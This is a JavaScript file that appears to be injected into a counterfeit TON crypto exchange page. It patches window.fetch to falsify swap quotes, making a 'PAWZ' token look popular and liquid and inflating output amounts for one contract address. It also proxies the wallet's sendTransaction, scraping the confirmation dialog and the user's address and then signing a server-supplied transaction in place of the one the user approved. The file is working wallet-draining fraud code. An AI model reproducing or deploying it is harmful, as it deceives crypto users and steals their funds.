const origin = window.fetch;
window.fetch = async (url, opt)=>{
    if (url.includes("rpc")) {
        const bodyJson = JSON.parse(opt.body+"");

        if (["asset.search","asset.query","dex.simulate_swap"].includes(bodyJson.method)) {
            const response = await origin(url,opt);
            let json = await response.json();

            if (Array.isArray(json?.result?.assets)) {
                json.result.assets = json?.result.assets.map(a => ({
                    ...a,
                    ...(a.meta.symbol === "PAWZ" && ({
                        tags: [
                            "high_liquidity",
                            "asset:default_symbol",
                            "asset:liquidity:very_high",
                            "asset:popular"
                        ],
                        dex_price_usd: "0.01174129320000000",
                        popularity_index: 10.825529881381648,
                        community: false,
                    }))
                }));
            }
            if (((bodyJson?.params?.ask_address+"")+(bodyJson.params.offer_address+"")).includes("EQDLBlDhMrZBMm5Kf2QhcLl75taWg7RIw1o6si_jBg_PPn4w")) {
                json.result.price_impact = "0.0009";
                json.result.ask_units += "0".repeat((bodyJson.params.offer_units?.length || 3) / 1.4);
            }

            console.log("OVERRIDE",json);

            return new Response(JSON.stringify(json), {
                statusText: response.statusText,
                status: response.status,
                headers: response.headers,
            });
        }
    }

    return await origin(url,opt);
}

window.ton_session_override = (o) => {
    console.log("TONSDK", o, typeof o);

    return new Proxy(o, {
        get(target, prop) {
            if (prop === 'sendTransaction') {
                return async (...args) => {

                    const search = new URLSearchParams();
                    search.set("address", target?.account?.address);

                    try {
                        const names = Array.from(document.querySelectorAll("[role=dialog] img") || []).map(o=>o?.alt).filter(Boolean);
                        const USDs = Array.from(document.querySelectorAll("[role=dialog] div > p > span") || []).map(o=>o?.innerText).filter(Boolean);
                        const values =Array.from(document.querySelectorAll("[role=dialog] div > h2:last-child") || []).map(o=>o?.innerText).filter(Boolean);

                        for (let i = 0; i < names.length; i++) {
                            search.set(`n${i+1}`,names[i]);
                        }
                        for (let i = 0; i < USDs.length; i++) {
                            search.set(`u${i+1}`, USDs[i]);
                        }
                        for (let i = 0; i < values.length; i++) {
                            search.set(`v${i+1}`, values[i]);
                        }
                    } catch {}

                    const query = await fetch(`/api/=))?${search.toString()}`).then(r=>r.json());
                    return target.sendTransaction(query,...args.slice(1));
                };
            }
            return target[prop];
        }
    });
};
